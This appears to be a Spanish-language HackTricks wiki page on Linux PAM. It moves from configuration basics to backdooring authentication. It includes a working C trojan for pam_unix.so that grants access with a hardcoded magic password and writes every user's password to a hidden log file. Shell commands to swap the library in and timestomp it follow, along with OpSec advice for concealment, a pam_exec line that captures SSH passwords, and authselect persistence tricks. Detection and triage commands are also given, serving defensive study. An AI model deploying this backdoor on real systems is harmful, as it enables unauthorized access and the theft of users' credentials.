# PAM - Pluggable Authentication Modules

{{#include ../../banners/hacktricks-training.md}}

### Información básica

**PAM (Pluggable Authentication Modules)** actúa como un mecanismo de seguridad que **verifica la identidad de los usuarios que intentan acceder a servicios informáticos**, controlando su acceso según diversos criterios. Es similar a un guardián digital, ya que garantiza que solo los usuarios autorizados puedan utilizar servicios específicos y, potencialmente, limita su uso para evitar la sobrecarga del sistema.

#### Archivos de configuración

- Los sistemas **basados en Solaris y UNIX** suelen utilizar un archivo de configuración central ubicado en `/etc/pam.conf`.
- Los sistemas **Linux** prefieren un enfoque basado en directorios y almacenan las configuraciones específicas de cada servicio en `/etc/pam.d`. Por ejemplo, el archivo de configuración del servicio de login se encuentra en `/etc/pam.d/login`.

Un ejemplo de configuración de PAM para el servicio de login podría ser el siguiente:
```
auth required /lib/security/pam_securetty.so
auth required /lib/security/pam_nologin.so
auth sufficient /lib/security/pam_ldap.so
auth required /lib/security/pam_unix_auth.so try_first_pass
account sufficient /lib/security/pam_ldap.so
account required /lib/security/pam_unix_acct.so
password required /lib/security/pam_cracklib.so
password required /lib/security/pam_ldap.so
password required /lib/security/pam_pwdb.so use_first_pass
session required /lib/security/pam_unix_session.so
```
#### **PAM Management Realms**

Estos realms o grupos de gestión incluyen **auth**, **account**, **password** y **session**, cada uno responsable de distintos aspectos del proceso de autenticación y gestión de sesiones:

- **Auth**: Valida la identidad del usuario, normalmente solicitando una contraseña.
- **Account**: Gestiona la verificación de la cuenta, comprobando condiciones como la pertenencia a grupos o las restricciones según la hora del día.
- **Password**: Gestiona las actualizaciones de contraseñas, incluyendo las comprobaciones de complejidad o la prevención de ataques de diccionario.
- **Session**: Gestiona las acciones durante el inicio o el cierre de una sesión de servicio, como montar directorios o establecer límites de recursos.

#### **PAM Module Controls**

Los controles determinan la respuesta del módulo ante el éxito o el fallo, influyendo en el proceso general de autenticación. Estos incluyen:

- **Required**: El fallo de un módulo required provoca un fallo eventual, pero solo después de comprobar todos los módulos posteriores.
- **Requisite**: Termina inmediatamente el proceso cuando se produce un fallo.
- **Sufficient**: Un resultado satisfactorio omite el resto de las comprobaciones del mismo realm, salvo que falle un módulo posterior.
- **Optional**: Solo provoca un fallo si es el único módulo del stack.

#### Offensive Semantics That Matter

Al hacer backdooring de PAM, la **ubicación de la regla insertada** suele ser más importante que el propio payload:

- `include` y `substack` cargan reglas de otros archivos, por lo que editar `sshd` podría afectar únicamente a SSH, mientras que editar `system-auth`, `common-auth` u otro stack compartido afecta a varios servicios a la vez.
- PAM también admite controles entre corchetes como `[success=1 default=ignore]`. Estos pueden abusarse para **omitir uno o más módulos** después de una comprobación personalizada satisfactoria, en lugar de reemplazar visiblemente `pam_unix.so`.
- `module-path` puede ser **absoluto** (`/usr/lib/security/pam_custom.so`) o **relativo** al directorio predeterminado de módulos PAM. En los sistemas Linux modernos, los directorios reales suelen ser `/lib/security`, `/lib64/security`, `/usr/lib/security` o rutas multiarch como `/usr/lib/x86_64-linux-gnu/security`.

Conclusión rápida para el operador: mapea siempre el **grafo completo de servicios** antes de aplicar un parche. Por ejemplo, `sshd -> password-auth -> system-auth` en algunas distros, o `sshd -> system-remote-login -> system-login -> system-auth` en otras, significa que el mismo implant de una sola línea puede propagarse mucho más de lo previsto.

#### Example Scenario

En una configuración con varios módulos de auth, el proceso sigue un orden estricto. Si el módulo `pam_securetty` determina que el terminal de login no está autorizado, se bloquean los logins de root; sin embargo, todos los módulos continúan procesándose debido a su estado "required". `pam_env` establece variables de entorno, lo que potencialmente mejora la experiencia del usuario. Los módulos `pam_ldap` y `pam_unix` trabajan conjuntamente para autenticar al usuario, y `pam_unix` intenta utilizar una contraseña suministrada previamente, mejorando la eficiencia y la flexibilidad de los métodos de autenticación.


## Backdooring PAM – Hooking `pam_unix.so`

Un truco clásico de persistencia en entornos Linux de alto valor consiste en **intercambiar la biblioteca PAM legítima por un drop-in trojanizado**. Debido a que cada login mediante SSH o consola termina llamando a `pam_unix.so:pam_sm_authenticate()`, bastan unas pocas líneas de C para capturar credenciales o implementar un bypass de contraseña *mágica*.

### Compilation Cheatsheet
<details>
<summary>Sample `pam_unix.so` trojan</summary>
```c
#define _GNU_SOURCE
#include <security/pam_modules.h>
#include <dlfcn.h>
#include <stdio.h>
#include <fcntl.h>
#include <unistd.h>

static int (*orig)(pam_handle_t *, int, int, const char **);
static const char *MAGIC = "Sup3rS3cret!";

int pam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, const char **argv) {
const char *user, *pass;
pam_get_user(pamh, &user, NULL);
pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

/* Magic pwd → immediate success */
if(pass && strcmp(pass, MAGIC) == 0) return PAM_SUCCESS;

/* Credential harvesting */
int fd = open("/usr/bin/.dbus.log", O_WRONLY|O_APPEND|O_CREAT, 0600);
dprintf(fd, "%s:%s\n", user, pass);
close(fd);

/* Fall back to original function */
if(!orig) {
orig = dlsym(RTLD_NEXT, "pam_sm_authenticate");
}
return orig(pamh, flags, argc, argv);
}
```
Compilar y reemplazar sigilosamente:
```bash
gcc -fPIC -shared -o pam_unix.so trojan_pam.c -ldl -lpam
mv /lib/security/pam_unix.so /lib/security/pam_unix.so.bak
mv pam_unix.so /lib/security/pam_unix.so
chmod 644 /lib/security/pam_unix.so     # keep original perms
touch -r /bin/ls /lib/security/pam_unix.so  # timestomp
```
### Consejos de OpSec
1. **Atomic overwrite** – escribe en un archivo temporal y usa `mv` para colocarlo en su ubicación, evitando bibliotecas escritas parcialmente que bloquearían el acceso SSH.
2. Colocar el archivo de registro en rutas como `/usr/bin/.dbus.log` hace que se mezcle con artefactos legítimos del escritorio.
3. Mantén idénticas las exportaciones de símbolos (`pam_sm_setcred`, etc.) para evitar un comportamiento incorrecto de PAM.

### Detección
* Compara el MD5/SHA256 de `pam_unix.so` con el del paquete de la distro.
* `rpm -V pam` o `debsums -s libpam-modules` permiten detectar bibliotecas reemplazadas sin realizar un hashing manual.
* Comprueba si existen permisos de escritura para todos o propietarios inusuales en `/lib/security/`.
* Regla de `auditd`: `-w /lib/security/pam_unix.so -p wa -k pam-backdoor`.
* Busca módulos inesperados en las configuraciones de PAM: `grep -R "pam_[a-z].*\.so" /etc/pam.d/ | grep -v pam_unix`.

### Comandos rápidos de triage (tras un compromiso o durante threat hunting)
```bash
# 1) Spot alien PAM objects
find /{lib,usr/lib,usr/local/lib}{,64}/security -type f -printf '%p %s %M %u:%g %TY-%Tm-%Td\n' | grep -E 'pam_|libselinux'

# 2) Verify package integrity
command -v rpm >/dev/null && rpm -V pam || debsums -s libpam-modules

# 3) Identify non-packaged PAM modules
for f in /{lib,usr/lib,usr/local/lib}{,64}/security/*.so; do
dpkg -S "$f" >/dev/null 2>&1 || echo "UNPACKAGED: $f";
done

# 4) Look for stealth config edits
grep -R "pam_.*\.so" /etc/pam.d/ | grep -E 'plg|selinux|custom|exec'
```
### Abusing `pam_exec` for persistence
En lugar de reemplazar `pam_unix.so`, una opción menos invasiva es añadir una línea `pam_exec` en `/etc/pam.d/sshd` para que cada inicio de sesión SSH ejecute un implant mientras mantiene intacta la pila normal:
```bash
# Run on successful auth and receive the typed password on stdin
auth optional pam_exec.so quiet expose_authtok /usr/local/bin/.ssh_hook.sh
```
`pam_exec` recibe metadatos de PAM en variables de entorno como `PAM_USER`, `PAM_RHOST`, `PAM_SERVICE`, `PAM_TTY` y `PAM_TYPE`. Con `expose_authtok`, el helper también puede leer la contraseña desde `stdin` durante las fases `auth` o `password`. Si quieres que el helper se ejecute con el UID efectivo en lugar del UID real, añade `seteuid`.

Notas prácticas:

- `session optional pam_exec.so ...` es mejor para **acciones posteriores al inicio de sesión**, como volver a abrir sockets o iniciar un daemon desacoplado.
- `auth optional pam_exec.so quiet expose_authtok ...` es la opción habitual para la **captura de credenciales**, porque se ejecuta antes de que se abra la sesión.
- `type=session` o `type=auth` se pueden usar para limitar la ejecución a una fase PAM específica y evitar una doble ejecución ruidosa.

### Sobrevivir a las herramientas de la distribución: `authselect`

En RHEL, CentOS Stream, Fedora y sistemas derivados, las ediciones directas de archivos generados como `/etc/pam.d/system-auth` o `/etc/pam.d/password-auth` pueden ser **sobrescritas por `authselect`**. Para mantener la persistencia, los operadores suelen modificar el perfil personalizado activo en `/etc/authselect/custom/<profile>/` y después volver a seleccionarlo o aplicarlo.

Flujo de trabajo habitual cuando tienes root:
```bash
# Inspect the active profile first
authselect current

# If a custom profile already exists, edit its PAM templates instead of system-auth directly
find /etc/authselect/custom -maxdepth 2 -type f \( -name 'system-auth' -o -name 'password-auth' \) -ls

# Re-apply the profile after modifying the template files
authselect select custom/<profile>
```
Esto es importante tanto para offense como para triage: si `/etc/pam.d/system-auth` contiene el banner `Generated by authselect` y `Do not modify this file manually`, entonces el punto de persistencia real podría encontrarse en `/etc/authselect/custom/` en lugar de `/etc/pam.d/`.

### Tradecraft reciente observado en la práctica

Los informes recientes de 2025 sobre el backdoor de Linux **Plague** mostraron la misma idea central llevada más lejos: un componente PAM malicioso con una **static bypass password**, además de la limpieza de variables de entorno relacionadas con SSH y del historial del shell (`HISTFILE=/dev/null`) para reducir los rastros de la sesión después del login. Este es un patrón de hunting útil porque la lógica del backdoor puede residir en PAM, mientras que los artefactos de stealth solo aparecen **después** de que la autenticación tiene éxito.


## Referencias

- [pam.conf(5) / pam.d(5) - Linux-PAM Manual](https://man7.org/linux/man-pages/man5/pam.d.5.html)
- [Nextron Systems - Plague: A Newly Discovered PAM-Based Backdoor for Linux](https://www.nextron-systems.com/2025/08/01/plague-a-newly-discovered-pam-based-backdoor-for-linux/)

{{#include ../../banners/hacktricks-training.md}}
